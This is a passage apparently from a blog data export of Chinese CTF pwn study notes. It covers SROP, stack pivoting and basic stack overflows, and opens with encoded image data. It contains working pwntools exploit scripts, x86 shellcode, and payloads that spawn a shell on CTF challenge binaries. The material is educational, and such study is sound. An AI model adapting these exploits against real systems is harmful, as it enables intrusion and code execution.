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)\n\n但是目前它已经被vsyscall-emulate和vdso机制代替了。此外，目前大多数系统都会开启ASLR保护，所以相对来说这些gadgets都并不容易找到。\n\n值得一说的是，对于sigreturn系统调用来说，在64位系统中，sigreturn系统调用对应的系统调用号为15，只需要RAX=15，并且执行syscall即可实现调用syscall调用。而RAX寄存器的值又可以通过控制某个函数的返回值来间接控制，比如说read函数的返回值为读取的字节数。\n\n**利用工具**\n\n**值得一提的是，在目前的pwntools中已经集成了对于srop的攻击。**\n\n**360春秋杯中的smallest-pwn为例**\n\n1.确定文件基本信息\n\n➜ smallest file smallest   \n smallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped\n\n可以看到该程序为64位静态链接版本。\n\n2.检查保护\n\n➜ smallest checksec smallest   \n   Arch:   amd64-64-little\n   RELRO:  No RELRO\n   Stack:  No canary found\n   NX:    NX enabled\n   PIE:   No PIE (0x400000)\n\n程序主要开启了NX保护。\n\n3.漏洞发现\n\n实用IDA直接反编译看了一下，发现程序就几行汇编代码，如下\n\n```assembly\npublic start\nstart proc near\nxor     rax, rax\nmov     edx, 400h\nmov     rsi, rsp\nmov     rdi, rax\nsyscall\nretn\nstart endp\n```\n\n根据syscall的编号为0，可以知道改程序执行的指令为read(0,$rsp,400)，即向栈顶读入400个字符。毫无疑问，这个是有栈溢出的。\n\n4.利用思路\n\n由于程序中并没有sigreturn调用，所以我们得自己构造，正好这里有read函数调用，所以我们可以通过read函数读取的字节数来设置rax的值。重要思路如下\n\n- 通过控制read读取的字符数来设置RAX寄存器的值，从而执行sigreturn\n- 通过syscall执行execve(\"/bin/sh\",0,0)来获取shell。\n\n5.漏洞利用程序\n\n```python\nfrom pwn import *\nfrom LibcSearcher import *\nsmall = ELF('./smallest')\nif args['REMOTE']:\n    sh = remote('127.0.0.1', 7777)\nelse:\n    sh = process('./smallest')\ncontext.arch = 'amd64'\ncontext.log_level = 'debug'\nsyscall_ret = 0x00000000004000BE\nstart_addr = 0x00000000004000B0\n## set start addr three times\npayload = p64(start_addr) * 3\nsh.send(payload)\n## modify the return addr to start_addr+3\n## so that skip the xor rax,rax; then the rax=1\n## get stack addr\nsh.send('\\xb3')\nstack_addr = u64(sh.recv()[8:16])\nlog.success('leak stack addr :' + hex(stack_addr))\n## make the rsp point to stack_addr\n## the frame is read(0,stack_addr,0x400)\nsigframe = SigreturnFrame()\nsigframe.rax = constants.SYS_read\nsigframe.rdi = 0\nsigframe.rsi = stack_addr\nsigframe.rdx = 0x400\nsigframe.rsp = stack_addr\nsigframe.rip = syscall_ret\npayload = p64(start_addr) + 'a' * 8 + str(sigframe)\nsh.send(payload)\n## set rax=15 and call sigreturn\nsigreturn = p64(syscall_ret) + 'b' * 7\nsh.send(sigreturn)\n## call execv(\"/bin/sh\",0,0)\nsigframe = SigreturnFrame()\nsigframe.rax = constants.SYS_execve\nsigframe.rdi = stack_addr + 0x120  # \"/bin/sh\" 's addr\nsigframe.rsi = 0x0\nsigframe.rdx = 0x0\nsigframe.rsp = stack_addr\nsigframe.rip = syscall_ret\nframe_payload = p64(start_addr) + 'b' * 8 + str(sigframe)\nprint len(frame_payload)\npayload = frame_payload + (0x120 - len(frame_payload)) * '\\x00' + '/bin/sh\\x00'\nsh.send(payload)\nsh.send(sigreturn)\nsh.interactive()\n```\n\n其基本流程为\n\n- 读取三个程序起始地址\n- 程序返回时，利用第一个程序起始地址读取地址，修改返回地址(即第二个程序起始地址)为源程序的第二条指令，并且会设置rax=1\n- 那么此时将会执行write(1,$esp,0x400)，泄露栈地址。\n- 利用第三个程序起始地址进而读入payload\n- 再次读取构造sigreturn调用，进而将向栈地址所在位置读入数据，构造execve('/bin/sh',0,0)\n- 再次读取构造sigreturn调用，从而获取shell。\n\n**花式栈溢出技巧**\n\n**stack privot**\n\nstack privot，正如它所描述的，该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行ROP。一般来说，我们可能在以下情况需要使用stack privot\n\n- 可以控制的栈溢出的字节数较少，难以构造较长的ROP链\n- 开启了PIE保护，栈地址未知，我们可以将栈劫持到已知的区域。\n- 其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而利用堆漏洞\n\n此外，利用stack privot有以下几个要求\n\n- 可以控制程序执行流。\n\n- 可以控制sp指针。一般来说，控制栈指针会使用ROP，常见的控制栈指针的gadgets一般是\n\n  **pop rsp/esp**\n\n当然，还会有一些其它的姿势。比如说libc_csu_init中的gadgets，我们通过偏移就可以得到控制rsp指针。上面的是正常的，下面的是偏移的。\n\n```assembly\ngef➤  x/7i 0x000000000040061a\n0x40061a <__libc_csu_init+90>:  pop    rbx\n0x40061b <__libc_csu_init+91>:  pop    rbp\n0x40061c <__libc_csu_init+92>:  pop    r12\n0x40061e <__libc_csu_init+94>:  pop    r13\n0x400620 <__libc_csu_init+96>:  pop    r14\n0x400622 <__libc_csu_init+98>:  pop    r15\n0x400624 <__libc_csu_init+100>: ret    \ngef➤  x/7i 0x000000000040061d\n0x40061d <__libc_csu_init+93>:  pop    rsp\n0x40061e <__libc_csu_init+94>:  pop    r13\n0x400620 <__libc_csu_init+96>:  pop    r14\n0x400622 <__libc_csu_init+98>:  pop    r15\n0x400624 <__libc_csu_init+100>: ret\n```\n\n此外，还有更加高级的fake frame。\n\n- 存在可以控制内容的内存，一般有如下\n- bss段。由于进程按页分配内存，分配给bss段的内存大小至少一个页(4k,0x1000)大小。然而一般bss段的内容用不了这么多的空间，并且bss段分配的内存页拥有读写权限。\n- heap。但是这个需要我们能够泄露堆地址。\n\n以**X-CTF Quals 2016 - b0verfl0w**为例\n\n1.首先，查看程序的安全保护，如下：\n\n➜ X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ checksec b0verfl0w         \n   Arch:   i386-32-little\n   RELRO:  Partial RELRO\n   Stack:  No canary found\n   NX:    NX disabled\n   PIE:   No PIE (0x8048000)\n   RWX:   Has RWX segments\n\n2.可以看出源程序为32位，也没有开启NX保护，下面我们来找一下程序的漏洞：\n\n```c\nsigned int vul()\n{\n  char s; // [sp+18h] [bp-20h]@1\n  puts(\"\\n======================\");\n  puts(\"\\nWelcome to X-CTF 2016!\");\n  puts(\"\\n======================\");\n  puts(\"What's your name?\");\n  fflush(stdout);\n  fgets(&s, 50, stdin);\n  printf(\"Hello %s.\", &s);\n  fflush(stdout);\n  return 1;\n}\n```\n\n3.可以看出，源程序存在栈溢出漏洞。但是其所能溢出的字节就只有50-0x20-4=14个字节，所以我们很难执行一些比较好的ROP。这里我们就考虑stack privot。由于程序本身并没有开启堆栈保护，所以我们可以在栈上布置shellcode并执行。基本利用思路如下：\n\n\\- 利用栈溢出布置shellcode\n \\- 控制eip指向shellcode处\n\n4.第一步，还是比较容易地，直接读取即可，但是由于程序本身会开启ASLR保护，所以我们很难直接知道shellcode的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对esp进行操作，使其指向shellcode处，并且直接控制程序跳转至esp处。那下面就是找控制程序跳转到esp处的gadgets了。\n\n```assembly\n➜  X-CTF Quals 2016 - b0verfl0w git:(iromise) ✗ ROPgadget --binary b0verfl0w --only 'jmp|ret'         \nGadgets information\n============================================================\n0x08048504 : jmp esp\n0x0804836a : ret\n0x0804847e : ret 0xeac1\nUnique gadgets found: 3\n```\n\n5.这里我们发现有一个可以直接跳转到esp的gadgets。那么我们可以布置payload如下：\n\n```\nshellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp\n```\n\n那么我们payload中的最后一部分改如何设置esp呢，可以知道：\n\n- size(shellcode+padding)=0x20\n- size(fake ebp)=0x4\n- size(0x08048504)=0x4\n\n所以我们最后一段需要执行的指令就是：\n\nsub 0x28,esp\njmp esp\n\n所以最后的exp如下：\n\n```python\nfrom pwn import *\nsh = process('./b0verfl0w')\nshellcode_x86 = \"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\"\nshellcode_x86 += \"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\"\nshellcode_x86 += \"\\x0b\\xcd\\x80\"\nsub_esp_jmp = asm('sub esp, 0x28;jmp esp')\njmp_esp = 0x08048504\npayload = shellcode_x86 + (\n    0x20 - len(shellcode_x86)) * 'b' + 'bbbb' + p32(jmp_esp) + sub_esp_jmp\nsh.sendline(payload)\nsh.interactive()\n```\n\n### 完了，应该？？ ≧ ﹏ ≦！！！\n\n","slug":"ctfpwn4","published":1,"date":"2021-06-29T05:55:03.097Z","updated":"2021-06-29T09:04:00.940Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cksan4neh000crouv6m2v0i3j","content":"<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">学习笔记<span class=\"number\">4</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>栈介绍</strong></p>\n<p>栈是一种典型的先进后出(First in Last Out)的数据结构，其操作主要有压栈(push)与出栈(pop)两种操作，如下图所示（维基百科）。两种操作都是操作栈顶，当然，它也有相应的栈底。</p>\n<p>在计算机的汇编程序运行过程中，也充分利用了这一数据结构。每个程序都有自己的进程地址空间，进程地址空间中的某一部分就是该程序对应的栈，用于<strong>保存函数调用信息和局部变量</strong>。此外，常见的操作也同样是压栈与出栈。需要注意的是，与一般我们理解不同的是，<strong>程序的栈是从进程地址空间的高地址向低地址增长的</strong>。</p>\n<p><strong>函数调用栈</strong></p>\n<img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210629135714461.png\" alt=\"image-20210629135714461\" style=\"zoom:67%;\" />\n\n<p>需要注意的是，32位程序与64位程序有以下简单的区别</p>\n<ul>\n<li><p><strong>x86</strong></p>\n</li>\n<li><p><strong>函数参数</strong>在<strong>函数返回地址</strong>的上方</p>\n</li>\n<li><p><strong>x64</strong></p>\n</li>\n<li><p>x64中前六个参数依次保存在<strong>RDI,RSI, RDX, RCX, R8和 R9寄存器</strong>里，如果还有更多的参数的话才会保存在栈上。</p>\n</li>\n<li><p>内存地址不能大于0x00007FFFFFFFFFFF，<strong>6个字节长度</strong>，否则会抛出异常。</p>\n</li>\n</ul>\n<p><strong>栈溢出原理</strong></p>\n<p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致栈中与其相邻的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞(比如说，还有向堆中写，向bss段写)。而对于黑客来说，栈溢出漏洞轻则可以使得程序崩溃，重则可以使得攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是：</p>\n<ul>\n<li>程序必须向栈上写入数据。</li>\n<li>写入的数据大小没有被良好地控制。</li>\n</ul>\n<p>最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，<strong>当然需要确保这个地址的代码可以执行</strong>。下面，我们举一个简单的例子：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#<span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\">#<span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">success</span><span class=\"params\">()</span> </span>&#123; <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;You Hava already controlled it.&quot;</span>); &#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">vulnerable</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> s[<span class=\"number\">12</span>];</span><br><span class=\"line\">  gets(s);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(s);</span><br><span class=\"line\">  <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> **argv)</span> </span>&#123;</span><br><span class=\"line\">  vulnerable();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个程序的主要目的读取一个字符串，并将其输出。<strong>我们希望可以控制程序执行success函数。</strong></p>\n<p>1.首先，我们利用如下命令对齐进行编译</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example</span><br><span class=\"line\">stack_example.c: In function ‘vulnerable’:</span><br><span class=\"line\">stack_example.c:6:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]</span><br><span class=\"line\">   gets(s);</span><br><span class=\"line\">   ^</span><br><span class=\"line\">/tmp/ccPU8rRA.o：在函数‘vulnerable’中：</span><br><span class=\"line\">stack_example.c:(.text+0x27): 警告： the `gets&#x27; function is dangerous and should not be used.</span><br></pre></td></tr></table></figure>\n\n<p>可以看出gets本身是一个危险函数。而它因为其从不检查输入字符串的长度，而是以回车来判断是否输入结束，所以很容易可以导致栈溢出，</p>\n<p>历史上，<strong>莫里斯蠕虫</strong>第一种蠕虫病毒就利用了gets这个危险函数实现了栈溢出。</p>\n<p>此外，-m32 指的是生成32位程序； -fno-stack-protector 指的是不开启堆栈溢出保护，即不生成canary。此外，该程序并没有开启ASLR保护。这是为了更加方便地介绍栈溢出的基本利用方式。</p>\n<p>2.然后，我们在win操作机上利用IDA来反编译一下二进制程序并查看vulnerable函数（点击g输入vulnerable回车可以直接转到该函数），可以看到</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">vulnerable</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> s; <span class=\"comment\">// [sp+4h] [bp-14h]@1</span></span><br><span class=\"line\">gets(&amp;s);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(&amp;s);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>3.可以看到，该字符串距离ebp的长度为0x14，那么相应的栈结构为</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+-----------------+</span><br><span class=\"line\">                          |     retaddr     |</span><br><span class=\"line\">                          +-----------------+</span><br><span class=\"line\">                          |     saved ebp   |</span><br><span class=\"line\">                   ebp---&gt;+-----------------+</span><br><span class=\"line\">                          |                 |</span><br><span class=\"line\">                          |                 |</span><br><span class=\"line\">                          |                 |</span><br><span class=\"line\">                          |                 |</span><br><span class=\"line\">                          |                 |</span><br><span class=\"line\">                          |                 |</span><br><span class=\"line\">             s,ebp<span class=\"number\">-0x14</span>--&gt;+-----------------+</span><br></pre></td></tr></table></figure>\n\n<p>并且，我们可以通过readelf获得success的地址，其地址为0x0804843B。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">readelf -a stack_example |grep success</span><br><span class=\"line\">54: 0804843b    25 FUNC    GLOBAL DEFAULT   14 success</span><br></pre></td></tr></table></figure>\n\n<p>4.那么，如果我们读取的字符串为</p>\n<p>0x14*’a’+’bbbb’+success_addr</p>\n<p>由于gets会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将saved ebp覆盖为bbbb，将retaddr覆盖为success_addr，即，此时的栈结构为</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+-----------------+</span><br><span class=\"line\">                              |    <span class=\"number\">0x0804843B</span>   |</span><br><span class=\"line\">                              +-----------------+</span><br><span class=\"line\">                              |       bbbb      |</span><br><span class=\"line\">                       ebp---&gt;+-----------------+</span><br><span class=\"line\">                              |                 |</span><br><span class=\"line\">                              |                 |</span><br><span class=\"line\">                              |                 |</span><br><span class=\"line\">                              |                 |</span><br><span class=\"line\">                              |                 |</span><br><span class=\"line\">                              |                 |</span><br><span class=\"line\">                 s,ebp<span class=\"number\">-0x14</span>--&gt;+-----------------+\t</span><br></pre></td></tr></table></figure>\n\n<p>需要注意的是，由于在计算机内存中，对应的每个值都是按照字节存储的。一般情况下都是采用小端存储，即0x0804843B的存储是如下结构</p>\n<p>\\x3b\\x84\\x04\\x08</p>\n<p>6.但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候\\，x等也算一个单独的字符。。所以我们需要想办法将\\x3b之类的作为一个字符输入进去。那么此时我们就需要使用一波pwntools了(关于如何安装以及基本用法，请自行github)，这里利用pwntools的代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##coding=utf8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">## 构造与程序交互的对象</span></span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./stack_example&#x27;</span>)</span><br><span class=\"line\">success_addr = <span class=\"number\">0x0804843b</span></span><br><span class=\"line\"><span class=\"comment\">## 构造payload</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">0x14</span> + <span class=\"string\">&#x27;bbbb&#x27;</span> + p32(success_addr)</span><br><span class=\"line\"><span class=\"built_in\">print</span> p32(success_addr)</span><br><span class=\"line\"><span class=\"comment\">## 向程序发送字符串</span></span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\"><span class=\"comment\">## 将代码交互转换为手工交互</span></span><br><span class=\"line\">sh.interactive()</span><br><span class=\"line\"><span class=\"comment\">#7.执行一波代码，可以得到</span></span><br><span class=\"line\">➜  stack-example python exp.py</span><br><span class=\"line\">[+] Starting local process <span class=\"string\">&#x27;./stack_example&#x27;</span>: pid <span class=\"number\">61936</span></span><br><span class=\"line\">;\\x84\\x0</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">aaaaaaaaaaaaaaaaaaaabbbb;\\x84\\x0</span><br><span class=\"line\">You Hava already controlled it.</span><br><span class=\"line\">[*] Got EOF <span class=\"keyword\">while</span> reading <span class=\"keyword\">in</span> interactive</span><br><span class=\"line\">$ </span><br><span class=\"line\">[*] Process <span class=\"string\">&#x27;./stack_example&#x27;</span> stopped <span class=\"keyword\">with</span> exit code -<span class=\"number\">11</span> (SIGSEGV) (pid <span class=\"number\">61936</span>)</span><br><span class=\"line\">[*] Got EOF <span class=\"keyword\">while</span> sending <span class=\"keyword\">in</span> interactive</span><br></pre></td></tr></table></figure>\n\n<p>可以看到我们确实已经执行success函数。</p>\n<p><strong>总结</strong></p>\n<p><strong>寻找危险函数</strong></p>\n<p>通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。</p>\n<p>常见的危险函数如下</p>\n<ul>\n<li><p>输入</p>\n</li>\n<li><ul>\n<li>gets，直接读取一行，忽略’\\x00’</li>\n<li>scanf</li>\n<li>vscanf</li>\n</ul>\n</li>\n<li><p>输出</p>\n</li>\n<li><ul>\n<li>sprintf</li>\n</ul>\n</li>\n<li><p>字符串</p>\n</li>\n<li><ul>\n<li>strcpy，字符串复制，遇到’\\x00’停止</li>\n<li>strcat，字符串拼接，遇到’\\x00’停止</li>\n<li>bcopy</li>\n</ul>\n</li>\n</ul>\n<p><strong>确定填充长度</strong></p>\n<p>这一部分主要是计算<strong>我们所要操作的地址与我们所要覆盖的地址的距离</strong>。常见的操作方法就是打开IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p>\n<ul>\n<li>相对于栈基地址的的索引</li>\n<li>相对应栈顶指针的索引</li>\n<li>直接地址索引</li>\n</ul>\n<p>其中相对于栈基地址的索引，可以直接通过查看EBP相对偏移获得；相对于栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种问题。通过绝对地址索引的，就相当于直接给定了地址。一般来说，我们会有如下的覆盖需求</p>\n<ul>\n<li><strong>覆盖函数返回地址</strong>，这时候就是直接看EBP即可。</li>\n<li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li>\n<li><strong>覆盖bss段某个变量的内容</strong>。</li>\n<li>等等</li>\n</ul>\n<p>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来直接或者间接地控制程序执行流程。</p>\n<h2 id=\"ROP大章\"><a href=\"#ROP大章\" class=\"headerlink\" title=\"ROP大章\"></a>ROP大章</h2><p><strong>基本ROP</strong>-<strong>ret2text</strong></p>\n<p>随着NX保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是ROP(Return Oriented 